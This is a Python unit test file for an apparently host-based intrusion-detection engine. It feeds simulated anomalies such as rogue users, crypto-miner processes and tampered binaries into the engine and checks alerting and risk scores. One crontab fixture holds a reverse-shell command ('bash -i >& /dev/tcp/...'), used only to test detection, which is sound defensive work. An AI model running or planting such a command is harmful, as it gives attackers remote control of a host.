import unittest
from pathlib import Path
from unittest.mock import patch
from orin.core.database import OrinStorage
from orin.analysis.engine import run_analysis_cycle

class TestEngine(unittest.TestCase):
    def setUp(self):
        self.unhide_patcher = patch("orin.analysis.engine.detect_hidden_processes", return_value=[])
        self.mock_detect_hidden = self.unhide_patcher.start()
        self.db_path = Path("test_engine_unit.db")
        self.storage = OrinStorage(self.db_path)
        self.storage.initialize_db()
        
        with self.storage.get_connection() as conn:
            conn.execute(
                "INSERT INTO baseline_users (username, uid, gid) VALUES ('root', 0, 0);"
            )
            conn.commit()

    def tearDown(self):
        self.unhide_patcher.stop()
        if self.db_path.exists():
            self.db_path.unlink()

    @patch("orin.analysis.engine.load_config")
    def test_port_whitelisting(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": ["code", "antigravity-ide"],
            "critical_paths": [],
            "critical_dirs": []
        }

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 35415, 'TCP', 'antigravity-ide (PID: 7374)');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 9999, 'TCP', 'malicious (PID: 666)');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 555, 'TCP', 'code (PID: 999)');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT description FROM security_events WHERE event_type = 'unexpected_port';")
            events = [row["description"] for row in cursor.fetchall()]
            
            self.assertEqual(len(events), 2)
            self.assertTrue(any("9999" in ev for ev in events))
            self.assertTrue(any("555" in ev for ev in events))
            self.assertFalse(any("35415" in ev for ev in events))
            self.assertFalse(any("22" in ev for ev in events))

    @patch("orin.analysis.engine.load_config")
    def test_auto_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": ["code"],
            "critical_paths": [],
            "critical_dirs": []
        }

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 9999, 'TCP', 'malicious (PID: 666)');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT resolved FROM security_events WHERE event_type = 'unexpected_port' AND description LIKE '%9999%';")
            self.assertEqual(cursor.fetchone()["resolved"], 0)

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT resolved FROM security_events WHERE event_type = 'unexpected_port' AND description LIKE '%9999%';")
            self.assertEqual(cursor.fetchone()["resolved"], 1)

    @patch("orin.analysis.engine.load_config")
    def test_risk_score_calculation(self, mock_load_config):
        """Verify the Severity-Tiered Risk Scoring Model calculations."""
        # 1. Zero events -> score 0
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }
        with self.storage.get_connection() as conn:
            # Clean up snapshots and events first
            conn.execute("DELETE FROM collected_ports;")
            conn.execute("DELETE FROM system_snapshots;")
            conn.execute("DELETE FROM security_events;")
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            # Only expected port, no anomalies
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["events_count"], 0)
        self.assertEqual(res["risk_score"], 0)

        # 2. A single medium event (unexpected port) -> score 35
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 9999, 'TCP', 'malicious');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["events_count"], 1)
        self.assertEqual(res["risk_score"], 35)

        # 3. 10 medium events (10 unexpected ports) -> score capped at 49 (35 + 9 * 1.5 = 48.5 -> 49)
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (3, 22, 'TCP', 'sshd');")
            for p in range(9000, 9010): # 10 ports
                conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (3, ?, 'TCP', 'malicious');", (p,))
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["events_count"], 10)
        self.assertEqual(res["risk_score"], 49) # 35 + 9 * 1.5 = 48.5, rounded to 49

        # 4. Critical event present (e.g. unauthorized user profile created with UID 0) -> score starts at 90
        with self.storage.get_connection() as conn:
            # Let's clear users baseline to trigger unauthorized user created
            conn.execute("DELETE FROM baseline_users;")
            # Snapshot 4
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (4, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (4, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (4, 'attacker', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["risk_score"], 90)

    @patch("orin.analysis.engine.load_config")
    def test_forensic_auto_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }

        # Setup baseline users
        with self.storage.get_connection() as conn:
            conn.execute("INSERT OR REPLACE INTO baseline_users (username, uid, gid) VALUES ('musa', 1000, 1000);")
            conn.commit()

        # Step 1: Insert snapshot 1 with all kinds of forensic anomalies
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            # 1. deleted_binary_execution
            conn.execute("INSERT INTO collected_deleted_binaries (snapshot_id, pid, exe, sha256, md5, vault_path) VALUES (1, 9999, '/usr/bin/evil', 'sha', 'md5', '/vault/path');")
            # 2. promiscuous_interface
            conn.execute("INSERT INTO collected_promisc_interfaces (snapshot_id, interface, flags, is_promiscuous) VALUES (1, 'eth0', '0x100', 1);")
            # 3. pkg_integrity_violation
            conn.execute("INSERT INTO collected_pkg_integrity (snapshot_id, package, file_path, expected_md5, actual_md5, actual_sha256, status) VALUES (1, 'sudo', '/usr/bin/sudo', 'abc', 'def', 'xyz', 'modified');")
            # 4. unauthorized_user_created
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'eviluser', 1001, 1001);")
            # 5. privilege_escalation_hijack
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'musa', 0, 1000);")
            # 6. suspicious_process_ancestry
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (1, 8888, 1, 'xmrig', '/tmp/xmrig', '/tmp/xmrig');")
            # 7. hidden_process (via mock)
            self.mock_detect_hidden.return_value = [{"pid": 7777, "status": "hidden", "reason": "Process responds to signal 0 but is not present in /proc"}]
            conn.commit()

        # Run analysis for snapshot 1 to trigger insertion of security events
        run_analysis_cycle(self.db_path)

        # Verify that all events are present and unresolved (resolved = 0)
        expected_types = [
            "deleted_binary_execution",
            "promiscuous_interface",
            "pkg_integrity_violation",
            "unauthorized_user_created",
            "privilege_escalation_hijack",
            "suspicious_process_ancestry",
            "hidden_process"
        ]
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            for et in expected_types:
                cursor.execute("SELECT resolved FROM security_events WHERE event_type = ?;", (et,))
                rows = cursor.fetchall()
                self.assertGreater(len(rows), 0, f"Expected event of type {et} to be created")
                for r in rows:
                    self.assertEqual(r["resolved"], 0, f"Event {et} should be unresolved initially")

        # Step 2: Insert snapshot 2 where all anomalies have been resolved
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            # Clear or set standard normal state records for snapshot 2
            # Normal users (eviluser deleted, musa restored to uid 1000)
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'musa', 1000, 1000);")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            # No suspicious processes
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (2, 100, 1, 'systemd', '/usr/lib/systemd/systemd', '');")
            # No hidden processes
            self.mock_detect_hidden.return_value = []
            conn.commit()

        # Run analysis for snapshot 2 to trigger auto-resolution
        run_analysis_cycle(self.db_path)

        # Verify that all events have been marked as resolved (resolved = 1)
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            for et in expected_types:
                cursor.execute("SELECT resolved FROM security_events WHERE event_type = ?;", (et,))
                rows = cursor.fetchall()
                self.assertGreater(len(rows), 0, f"Expected event of type {et} to persist in ledger")
                for r in rows:
                    self.assertEqual(r["resolved"], 1, f"Expected event {et} to be auto-resolved")

    @patch("orin.analysis.engine.load_config")
    def test_cron_rules_and_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }

        # Step 1: Snapshot 1 with a benign cron
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (1, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify no cron events in snapshot 1
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM security_events WHERE event_type LIKE 'cron%' OR event_type = 'new_cron_job';")
            self.assertEqual(len(cursor.fetchall()), 0)

        # Step 2: Snapshot 2 with new crons (volatile execution, suspicious command, and drift)
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            # Benign cron remains
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            # Volatile cron added
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/var/spool/cron/crontabs/alice', 'alice', '* * * * *', '/tmp/backup.sh');"
            )
            # Suspicious cron command added
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/cron.d/shell', 'root', '* * * * *', 'bash -i >& /dev/tcp/1.1.1.1/4444');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify alerts triggered
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type, resolved FROM security_events WHERE resolved = 0;")
            events = cursor.fetchall()
            event_types = [e["event_type"] for e in events]
            
            self.assertEqual(len(events), 4)
            self.assertEqual(event_types.count("new_cron_job"), 2)
            self.assertEqual(event_types.count("cron_volatile_execution"), 1)
            self.assertEqual(event_types.count("cron_suspicious_command"), 1)

        # Step 3: Snapshot 3 with volatile & suspicious crons removed
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
            # Benign cron remains
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (3, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify all those alerts are now resolved
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type, resolved FROM security_events WHERE event_type IN ('new_cron_job', 'cron_volatile_execution', 'cron_suspicious_command');")
            events = cursor.fetchall()
            self.assertEqual(len(events), 4)
            for e in events:
                self.assertEqual(e["resolved"], 1, f"Expected event {e['event_type']} to be auto-resolved")

if __name__ == "__main__":
    unittest.main()
